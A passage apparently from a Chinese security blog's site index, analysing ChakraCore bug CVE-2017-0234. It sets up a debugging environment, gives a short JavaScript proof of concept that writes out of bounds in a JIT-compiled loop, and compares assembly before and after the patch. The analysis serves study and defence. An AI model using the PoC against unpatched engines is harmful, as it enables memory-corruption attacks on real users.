class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> v8 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>case study:cve-2017-0234</title>
      <link href="/2018/07/03/cve-2017-0234-3.0/"/>
      <url>/2018/07/03/cve-2017-0234-3.0/</url>
      <content type="html"><![CDATA[<h3 id="vs调试环境配置"><a href="#vs调试环境配置" class="headerlink" title="vs调试环境配置"></a>vs调试环境配置</h3><h4 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h4><p>首先下载<a href="https://github.com/Microsoft/ChakraCore" target="_blank" rel="noopener">ChakraCore</a><br>然后<code>git clone https://github.com/Microsoft/ChakraCore.git</code><br>在ChakraCore项目中搜索CVE-2017-0234，找到patch的commit，然后得到有漏洞的版本的hash<br> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070412.jpg" alt=""><br>然后checkout,<code>git checkout d8ef97d90c231e83db96dc4fdff4b39409f7a9b6</code><br>然后在VS2015中打开<code>Build\Chakra.Core.sln</code>，并生成解决方案<br> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070434.jpg" alt=""></p><h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><p> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070449.jpg" alt=""><br>右键设置为启动项目<br> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070458.jpg" alt=""><br>在命令参数写好绝对路径并执行<br> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070506.jpg" alt=""><br> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070515.jpg" alt=""></p><h3 id="windbg调试环境配置"><a href="#windbg调试环境配置" class="headerlink" title="windbg调试环境配置"></a>windbg调试环境配置</h3><p>在windows store下载windbg preview<br>设置符号服务器<br><code>SRV*c:\edgesymbol*http://msdl.microsoft.com/download/symbols</code><br> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070526.jpg" alt=""><br>直接调试chakra<br> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070550.jpg" alt=""><br>Windbg preview可以直接查看源码，在源码点击下断,很方便。</p><h3 id="crash"><a href="#crash" class="headerlink" title="crash"></a>crash</h3><p>PoC<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">begin, end, step, num</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = begin; i &lt; end; i += step) view[i] = num;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x10000</span>);</span><br><span class="line"><span class="keyword">var</span> view = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(buffer);</span><br><span class="line"></span><br><span class="line">write(<span class="number">0</span>, <span class="number">0x4000</span>, <span class="number">1</span>, <span class="number">0x1234</span>);</span><br><span class="line">write(<span class="number">0x3000000e</span>, <span class="number">0x40000010</span>, <span class="number">0x10000</span>, <span class="number">1851880825</span>);</span><br></pre></td></tr></table></figure></p><p> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070621.jpg" alt=""><br> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070909.jpg" alt=""><br> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070946.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&gt;k</span><br><span class="line"> 索引     函数      </span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line"> 1      0000018d9694015c()</span><br><span class="line">*2      ChakraCore.dll!Js::InterpreterStackFrame::CallLoopBody(void *(*)(Js::RecyclableObject *, Js::CallInfo) address=0x0000018d96940000)</span><br><span class="line"> 3      ChakraCore.dll!Js::InterpreterStackFrame::DoLoopBodyStart(unsigned int loopNumber=0, Js::LayoutSize layoutSize=SmallLayout, const bool doProfileLoopCheck=false, bool isFirstIteration=true)</span><br><span class="line"> 4      ChakraCore.dll!Js::InterpreterStackFrame::ProfiledLoopBodyStart&lt;1,1&gt;(unsigned int loopNumber=0, Js::LayoutSize layoutSize=SmallLayout, bool isFirstIteration=true)</span><br><span class="line"> 5      ChakraCore.dll!Js::InterpreterStackFrame::OP_ProfiledLoopStart&lt;0,1&gt;(const unsigned char * ip=0x0000018d96828b49)</span><br><span class="line"> 6      ChakraCore.dll!Js::InterpreterStackFrame::ProcessProfiled()</span><br><span class="line"> 7      ChakraCore.dll!Js::InterpreterStackFrame::Process()</span><br><span class="line"> 8      ChakraCore.dll!Js::InterpreterStackFrame::InterpreterHelper(Js::ScriptFunction * function=0x0000019598284540, Js::ArgumentReader args=&#123;...&#125;, void * returnAddress=0x0000018d968e0fba, void * addressOfReturnAddress=0x0000002e3a7fe4b8, const bool isAsmJs=false)</span><br><span class="line"> 9      ChakraCore.dll!Js::InterpreterStackFrame::InterpreterThunk(Js::JavascriptCallStackLayout * layout=0x0000002e3a7fe4f0)</span><br><span class="line"> 10     [外部代码]  </span><br><span class="line"> 11     ChakraCore.dll!amd64_CallFunction()</span><br><span class="line"> 12     ChakraCore.dll!Js::JavascriptFunction::CallFunction&lt;1&gt;(Js::RecyclableObject * function=0x0000019598284540, void *(*)(Js::RecyclableObject *, Js::CallInfo) entryPoint=0x00007ffa62c074a0, Js::Arguments args=&#123;...&#125;)</span><br><span class="line"> 13     ChakraCore.dll!Js::InterpreterStackFrame::OP_CallCommon&lt;Js::OpLayoutDynamicProfile&lt;Js::OpLayoutT_CallIWithICIndex&lt;Js::LayoutSizePolicy&lt;0&gt; &gt; &gt; &gt;(const Js::OpLayoutDynamicProfile&lt;Js::OpLayoutT_CallIWithICIndex&lt;Js::LayoutSizePolicy&lt;0&gt; &gt; &gt; * playout=0x0000018d968b009f, Js::RecyclableObject * function=0x0000019598284540, unsigned int flags=16, const Js::AuxArray&lt;unsigned int&gt; * spreadIndices=0x0000000000000000)</span><br><span class="line"> 14     ChakraCore.dll!Js::InterpreterStackFrame::OP_ProfileCallCommon&lt;Js::OpLayoutDynamicProfile&lt;Js::OpLayoutT_CallIWithICIndex&lt;Js::LayoutSizePolicy&lt;0&gt; &gt; &gt; &gt;(const Js::OpLayoutDynamicProfile&lt;Js::OpLayoutT_CallIWithICIndex&lt;Js::LayoutSizePolicy&lt;0&gt; &gt; &gt; * playout=0x0000018d968b009f, Js::RecyclableObject * function=0x0000019598284540, unsigned int flags=0, unsigned short profileId=3, unsigned int inlineCacheIndex=3, const Js::AuxArray&lt;unsigned int&gt; * spreadIndices=0x0000000000000000)</span><br><span class="line"> 15     ChakraCore.dll!Js::InterpreterStackFrame::OP_ProfiledCallIWithICIndex&lt;Js::OpLayoutT_CallIWithICIndex&lt;Js::LayoutSizePolicy&lt;0&gt; &gt; &gt;(const Js::OpLayoutDynamicProfile&lt;Js::OpLayoutT_CallIWithICIndex&lt;Js::LayoutSizePolicy&lt;0&gt; &gt; &gt; * playout=0x0000018d968b009f, unsigned int flags=0)</span><br><span class="line"> 16     ChakraCore.dll!Js::InterpreterStackFrame::ProcessProfiled()</span><br><span class="line"> 17     ChakraCore.dll!Js::InterpreterStackFrame::Process()</span><br><span class="line"> 18     ChakraCore.dll!Js::InterpreterStackFrame::InterpreterHelper(Js::ScriptFunction * function=0x00000195982844e0, Js::ArgumentReader args=&#123;...&#125;, void * returnAddress=0x0000018d968e0fc2, void * addressOfReturnAddress=0x0000002e3a7fef48, const bool isAsmJs=false)</span><br><span class="line"> 19     ChakraCore.dll!Js::InterpreterStackFrame::InterpreterThunk(Js::JavascriptCallStackLayout * layout=0x0000002e3a7fef80)</span><br><span class="line"> 20     [外部代码]  </span><br><span class="line"> 21     ChakraCore.dll!amd64_CallFunction()</span><br><span class="line"> 22     ChakraCore.dll!Js::JavascriptFunction::CallFunction&lt;1&gt;(Js::RecyclableObject * function=0x00000195982844e0, void *(*)(Js::RecyclableObject *, Js::CallInfo) entryPoint=0x00007ffa62c074a0, Js::Arguments args=&#123;...&#125;)</span><br><span class="line"> 23     ChakraCore.dll!Js::JavascriptFunction::CallRootFunctionInternal(Js::Arguments args=&#123;...&#125;, Js::ScriptContext * scriptContext=0x0000018d968dd620, bool inScript=true)</span><br><span class="line"> 24     ChakraCore.dll!Js::JavascriptFunction::CallRootFunction(Js::Arguments args=&#123;...&#125;, Js::ScriptContext * scriptContext=0x0000018d968dd620, bool inScript=true)</span><br><span class="line"> 25     ChakraCore.dll!RunScriptCore::__l2::&lt;lambda&gt;(Js::ScriptContext * scriptContext=0x0000018d968dd620, TTD::TTDJsRTActionResultAutoRecorder &amp; _actionEntryPopper=&#123;...&#125;)</span><br><span class="line"> 26     ChakraCore.dll!ContextAPIWrapper::__l2::&lt;lambda&gt;(Js::ScriptContext * scriptContext=0x0000018d968dd620)</span><br><span class="line"> 27     ChakraCore.dll!ContextAPIWrapper_Core&lt;0,_JsErrorCode &lt;lambda&gt;(Js::ScriptContext *) &gt;(ContextAPIWrapper::__l2::_JsErrorCode &lt;lambda&gt;(Js::ScriptContext *) fn=_JsErrorCode &lt;lambda&gt;(Js::ScriptContext * scriptContext)&#123;...&#125;)</span><br><span class="line"> 28     ChakraCore.dll!ContextAPIWrapper&lt;0,_JsErrorCode &lt;lambda&gt;(Js::ScriptContext *, TTD::TTDJsRTActionResultAutoRecorder &amp;) &gt;(RunScriptCore::__l2::_JsErrorCode &lt;lambda&gt;(Js::ScriptContext *, TTD::TTDJsRTActionResultAutoRecorder &amp;) fn=_JsErrorCode &lt;lambda&gt;(Js::ScriptContext * scriptContext, TTD::TTDJsRTActionResultAutoRecorder &amp; _actionEntryPopper)&#123;...&#125;)</span><br><span class="line"> 29     ChakraCore.dll!RunScriptCore(void * scriptSource=0x00000195982bc000, const unsigned char * script=0x0000018d967278e0, unsigned __int64 cb=266, LoadScriptFlag loadScriptFlag=LoadScriptFlag_Utf8Source | LoadScriptFlag_ExternalArrayBuffer, unsigned __int64 sourceContext=0, const wchar_t * sourceUrl=0x0000018d9682c1c0, bool parseOnly=false, _JsParseScriptAttributes parseAttributes=JsParseScriptAttributeNone, bool isSourceModule=false, void * * result=0x0000000000000000)</span><br><span class="line"> 30     ChakraCore.dll!CompileRun(void * scriptVal=0x00000195982bc000, unsigned __int64 sourceContext=0, void * sourceUrl=0x000001959827d020, _JsParseScriptAttributes parseAttributes=JsParseScriptAttributeNone, void * * result=0x0000000000000000, bool parseOnly=false)</span><br><span class="line"> 31     ChakraCore.dll!JsRun(void * scriptVal=0x00000195982bc000, unsigned __int64 sourceContext=0, void * sourceUrl=0x000001959827d020, _JsParseScriptAttributes parseAttributes=JsParseScriptAttributeNone, void * * result=0x0000000000000000)</span><br><span class="line"> 32     ch.exe!ChakraRTInterface::JsRun(void * script=0x00000195982bc000, unsigned __int64 sourceContext=0, void * sourceUrl=0x000001959827d020, _JsParseScriptAttributes parseAttributes=JsParseScriptAttributeNone, void * * result=0x0000000000000000)</span><br><span class="line"> 33     ch.exe!RunScript(const char * fileName=0x0000018d9673df50, const char * fileContents=0x0000018d967278e0, void * bufferValue=0x0000000000000000, char * fullPath=0x0000002e3a7ffa70)</span><br><span class="line"> 34     ch.exe!ExecuteTest(const char * fileName=0x0000018d9673df50)</span><br><span class="line"> 35     ch.exe!ExecuteTestWithMemoryCheck(char * fileName=0x0000018d9673df50)</span><br><span class="line"> 36     ch.exe!StaticThreadProc(void * lpParam=0x0000002e3a17fba8)</span><br><span class="line"> 37     ch.exe!invoke_thread_procedure(unsigned int(*)(void *) procedure=0x00007ff7d84647d0, void * const context=0x0000002e3a17fba8)</span><br><span class="line"> 38     ch.exe!thread_start&lt;unsigned int (__cdecl*)(void * __ptr64)&gt;(void * const parameter=0x0000018d9673ea70)</span><br><span class="line"> 39     [外部代码]</span><br></pre></td></tr></table></figure></p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><h4 id="JIT"><a href="#JIT" class="headerlink" title="JIT"></a>JIT</h4><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-072024.jpg" alt=""><br>关于JIT生成不是重点，于是我调试了一下并没有详细写出调用，只是说一下。<br>在循环的解释执行次数超出loopInterpretCount的值的时候，就会进入JIT代码生成，然后在JIT代码生成后就转到JIT中执行，不再解释执行。</p><p>在JIT优化之后，DoLoopBodyStart调用CallLoopBody，参数是循环体JIT代码的地址。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-071023.jpg" alt=""><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fn-&gt;GetIsAsmJsFunction())</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="function">AutoRestoreLoopNumbers <span class="title">autoRestore</span><span class="params">(<span class="keyword">this</span>, loopNumber, doProfileLoopCheck)</span></span>;</span><br><span class="line">                newOffset = <span class="keyword">this</span>-&gt;CallAsmJsLoopBody(entryPointInfo-&gt;jsMethod);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                AutoRestoreLoopNumbers autoRestore(<span class="keyword">this</span>, loopNumber, doProfileLoopCheck);</span><br><span class="line">                newOffset = <span class="keyword">this</span>-&gt;CallLoopBody(entryPointInfo-&gt;jsMethod);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></p><p>漏洞触发在循环体中</p><h4 id="分析patch前汇编"><a href="#分析patch前汇编" class="headerlink" title="分析patch前汇编"></a>分析patch前汇编</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">0000018D96940138  mov         dword ptr [rdi+9397Ch],ecx  </span><br><span class="line">0000018D9694013E  inc         ecx  </span><br><span class="line">0000018D96940140  cmp         r9d,r10d ----&gt;检查begin是否小于end</span><br><span class="line">0000018D96940143  jge         0000018D96940181  </span><br><span class="line">0000018D96940145  mov         r11,r14  </span><br><span class="line">0000018D96940148  mov         r13,r11  </span><br><span class="line">0000018D9694014B  shr         r13,30h  </span><br><span class="line">0000018D9694014F  cmp         r13,1  </span><br><span class="line">0000018D96940153  jne         0000018D9694032F  </span><br><span class="line">0000018D96940159  mov         r13d,r11d  </span><br><span class="line">0000018D9694015C  mov         dword ptr [rsi+r9*4],r13d ----&gt;对数组元素赋值</span><br></pre></td></tr></table></figure><p><code>mov         dword ptr [rsi+r9*4],r13d</code>是对view数组元素赋值，rsi是buffer的首地址,r9是数组索引值i,r13d即1851880825(hex:0x6E617579)是要赋的值</p><p> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-071054.jpg" alt=""><br>由汇编可以看出，缺少对索引值的边界检查（或者说优化后只剩下了检查begin是否小于end，但是没有检查索引上界end是否超出数组内存边界）<br>于是就访问到了不能访问的地址,crash。</p><h3 id="patch分析"><a href="#patch分析" class="headerlink" title="patch分析"></a>patch分析</h3><ul><li>patch<br><a href="https://github.com/Microsoft/ChakraCore/commit/a1345ad48064921e8eb45fa0297ce405a7df14d3" target="_blank" rel="noopener">https://github.com/Microsoft/ChakraCore/commit/a1345ad48064921e8eb45fa0297ce405a7df14d3</a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Too aggressive bound check removal</span><br><span class="line">Don&apos;t eliminate bounds checks on virtual typed arrays if we can&apos;t guarantee that the accesses will be within 4Gb</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">-            eliminatedLowerBoundCheck = <span class="literal">true</span>;</span><br><span class="line">-            eliminatedUpperBoundCheck = <span class="literal">true</span>;</span><br><span class="line">-            canBailOutOnArrayAccessHelperCall = <span class="literal">false</span>;</span><br><span class="line">+            <span class="comment">// Unless we're in asm.js (where it is guaranteed that virtual typed array accesses cannot read/write beyond 4GB),</span></span><br><span class="line">+            <span class="comment">// check the range of the index to make sure we won't access beyond the reserved memory beforing eliminating bounds</span></span><br><span class="line">+            <span class="comment">// checks in jitted code.</span></span><br><span class="line">+            <span class="keyword">if</span> (!GetIsAsmJSFunc())</span><br><span class="line">+            &#123;</span><br><span class="line">+                IR::RegOpnd * idxOpnd = baseOwnerIndir-&gt;GetIndexOpnd();</span><br><span class="line">+                <span class="keyword">if</span> (idxOpnd)</span><br><span class="line">+                &#123;</span><br><span class="line">+                    StackSym * idxSym = idxOpnd-&gt;m_sym-&gt;IsTypeSpec() ? idxOpnd-&gt;m_sym-&gt;GetVarEquivSym(<span class="literal">nullptr</span>) : idxOpnd-&gt;m_sym;</span><br><span class="line">+                    Value * idxValue = FindValue(idxSym);</span><br><span class="line">+                    IntConstantBounds idxConstantBounds;</span><br><span class="line">+                    <span class="keyword">if</span> (idxValue &amp;&amp; idxValue-&gt;GetValueInfo()-&gt;TryGetIntConstantBounds(&amp;idxConstantBounds))</span><br><span class="line">+                    &#123;</span><br><span class="line">+                        BYTE indirScale = Lowerer::GetArrayIndirScale(baseValueType);</span><br><span class="line">+                        int32 upperBound = idxConstantBounds.UpperBound();</span><br><span class="line">+                        int32 lowerBound = idxConstantBounds.LowerBound();</span><br><span class="line">+                        <span class="keyword">if</span> (lowerBound &gt;= <span class="number">0</span> &amp;&amp; ((<span class="keyword">static_cast</span>&lt;uint64&gt;(upperBound) &lt;&lt; indirScale) &lt; MAX_ASMJS_ARRAYBUFFER_LENGTH))</span><br><span class="line">+                        &#123;</span><br><span class="line">+                            eliminatedLowerBoundCheck = <span class="literal">true</span>;</span><br><span class="line">+                            eliminatedUpperBoundCheck = <span class="literal">true</span>;</span><br><span class="line">+                            canBailOutOnArrayAccessHelperCall = <span class="literal">false</span>;</span><br><span class="line">+                        &#125;</span><br><span class="line">+                    &#125;</span><br><span class="line">+                &#125;</span><br><span class="line">+            &#125;</span><br><span class="line">+            <span class="keyword">else</span></span><br><span class="line">+            &#123;</span><br><span class="line">+                eliminatedLowerBoundCheck = <span class="literal">true</span>;</span><br><span class="line">+                eliminatedUpperBoundCheck = <span class="literal">true</span>;</span><br><span class="line">+                canBailOutOnArrayAccessHelperCall = <span class="literal">false</span>;</span><br><span class="line">+            &#125;</span><br></pre></td></tr></table></figure><p>要分析patch，可以先看一下patch后现在的JIT代码是什么样，跟进JIT。<br>在这下个断点，跟到JIT里<br> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-071206.jpg" alt=""><br>再在JIT里下断点<br> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-071218.jpg" alt=""><br>继续执行到断点，并单步跟进<br> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-071241.jpg" alt=""></p><h4 id="分析patch后汇编"><a href="#分析patch后汇编" class="headerlink" title="分析patch后汇编"></a>分析patch后汇编</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">000001E8AB960000  mov         rax,1DFAB6B0A78h  </span><br><span class="line">000001E8AB96000A  mov         rax,qword ptr [rax]  </span><br><span class="line">000001E8AB96000D  add         rax,1C20h  </span><br><span class="line">000001E8AB960014  jo          000001E8AB960376  </span><br><span class="line">000001E8AB96001A  cmp         rsp,rax  </span><br><span class="line">000001E8AB96001D  jle         000001E8AB960376  </span><br><span class="line">000001E8AB960023  nop         dword ptr [rax]  </span><br><span class="line">000001E8AB960027  nop         dword ptr [rax]  </span><br><span class="line">000001E8AB96002B  mov         qword ptr [rsp+20h],r9  </span><br><span class="line">000001E8AB960030  mov         qword ptr [rsp+18h],r8  </span><br><span class="line">000001E8AB960035  mov         qword ptr [rsp+10h],rdx  </span><br><span class="line">000001E8AB96003A  mov         qword ptr [rsp+8],rcx  </span><br><span class="line">000001E8AB96003F  push        rbp  </span><br><span class="line">000001E8AB960041  mov         rbp,rsp  </span><br><span class="line">000001E8AB960044  sub         rsp,30h  </span><br><span class="line">000001E8AB960048  push        r15  </span><br><span class="line">000001E8AB96004A  push        r14  </span><br><span class="line">000001E8AB96004C  push        r13  </span><br><span class="line">000001E8AB96004E  push        r12  </span><br><span class="line">000001E8AB960050  push        rdi  </span><br><span class="line">000001E8AB960052  push        rsi  </span><br><span class="line">000001E8AB960054  push        rbx  </span><br><span class="line">000001E8AB960056  sub         rsp,28h  </span><br><span class="line">000001E8AB96005A  mov         rbx,1DFAB6701C0h  </span><br><span class="line">000001E8AB960064  mov         rsi,7FFA484B2198h  </span><br><span class="line">000001E8AB96006E  mov         rdi,1E7AB7C47C4h  </span><br><span class="line">000001E8AB960078  mov         r12,qword ptr [rbp+20h]  </span><br><span class="line">000001E8AB96007C  mov         r13,qword ptr [r12+160h]  </span><br><span class="line">000001E8AB960084  mov         r14,qword ptr [r12+168h]  </span><br><span class="line">000001E8AB96008C  mov         r15,qword ptr [r12+158h]  </span><br><span class="line">000001E8AB960094  mov         rax,qword ptr [r12+170h]  </span><br><span class="line">000001E8AB96009C  xor         ecx,ecx  </span><br><span class="line">000001E8AB96009E  mov         byte ptr [rbx+41D18h],1  </span><br><span class="line">000001E8AB9600A5  mov         byte ptr [rbx+41BBAh],3  </span><br><span class="line">000001E8AB9600AC  mov         rdx,qword ptr [rdi+1784Ch]  </span><br><span class="line">000001E8AB9600B3  mov         rdx,qword ptr [rdx+38h]  </span><br><span class="line">000001E8AB9600B7  mov         byte ptr [rbx+41BBAh],0  </span><br><span class="line">000001E8AB9600BE  cmp         byte ptr [rbx+41D18h],1  </span><br><span class="line">000001E8AB9600C5  jne         000001E8AB9601CE  </span><br><span class="line">000001E8AB9600CB  mov         r8,r13  </span><br><span class="line">000001E8AB9600CE  mov         r9,r8  </span><br><span class="line">000001E8AB9600D1  shr         r9,30h  </span><br><span class="line">000001E8AB9600D5  cmp         r9,1  </span><br><span class="line">000001E8AB9600D9  jne         000001E8AB9601E4  </span><br><span class="line">000001E8AB9600DF  mov         r8d,r8d  </span><br><span class="line">000001E8AB9600E2  mov         r9,rax  </span><br><span class="line">000001E8AB9600E5  mov         r10,r9  </span><br><span class="line">000001E8AB9600E8  shr         r10,30h  </span><br><span class="line">000001E8AB9600EC  cmp         r10,1  </span><br><span class="line">000001E8AB9600F0  jne         000001E8AB960231  </span><br><span class="line">000001E8AB9600F6  mov         r9d,r9d  </span><br><span class="line">000001E8AB9600F9  mov         r10,r15  </span><br><span class="line">000001E8AB9600FC  mov         r11,r10  </span><br><span class="line">000001E8AB9600FF  shr         r11,30h  </span><br><span class="line">000001E8AB960103  cmp         r11,1  </span><br><span class="line">000001E8AB960107  jne         000001E8AB96028A  </span><br><span class="line">000001E8AB96010D  mov         r10d,r10d  </span><br><span class="line">000001E8AB960110  mov         r11,rdx  </span><br><span class="line">000001E8AB960113  shr         r11,30h  </span><br><span class="line">000001E8AB960117  jne         000001E8AB9602E4  </span><br><span class="line">000001E8AB96011D  cmp         qword ptr [rdx],rsi  </span><br><span class="line">000001E8AB960120  jne         000001E8AB9602E4  </span><br><span class="line">000001E8AB960126  mov         esi,dword ptr [rdx+20h]  </span><br><span class="line">000001E8AB960129  cmp         r10d,esi  ----&gt;比较索引上界是否超出数组内存边界（检查上界）</span><br></pre></td></tr></table></figure><ul><li>比较索引上界是否超出数组长度（检查上界）<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-071601.jpg" alt=""></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">000001E8AB96012C  jg          000001E8AB9602F7  </span><br><span class="line">000001E8AB960132  mov         rbx,qword ptr [rdx+38h]  </span><br><span class="line">000001E8AB960136  mov         rsi,1DFAB6B0A78h  </span><br><span class="line">000001E8AB960140  cmp         rsp,qword ptr [rsi]  </span><br><span class="line">000001E8AB960143  jle         000001E8AB96032A  </span><br><span class="line">000001E8AB960149  mov         dword ptr [rdi+9397Ch],ecx  </span><br><span class="line">000001E8AB96014F  inc         ecx  </span><br><span class="line">000001E8AB960151  cmp         r9d,r10d  -----&gt;比较索引值是否到达索引上界</span><br></pre></td></tr></table></figure><ul><li><p>比较索引值是否到达索引上界<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-071716.jpg" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">000001E8AB960154  jge         000001E8AB96019A  </span><br><span class="line">000001E8AB960156  test        r9d,r9d  </span><br><span class="line">000001E8AB960159  js          000001E8AB96033C  </span><br><span class="line">000001E8AB96015F  mov         rsi,r14  </span><br><span class="line">000001E8AB960162  mov         r11,rsi  </span><br><span class="line">000001E8AB960165  shr         r11,30h  </span><br><span class="line">000001E8AB960169  cmp         r11,1  </span><br><span class="line">000001E8AB96016D  jne         000001E8AB960358  </span><br><span class="line">000001E8AB960173  mov         esi,esi  </span><br><span class="line">000001E8AB960175  mov         dword ptr [rbx+r9*4],esi  -----&gt;数组赋值</span><br></pre></td></tr></table></figure></li><li><p>数组赋值<br><img 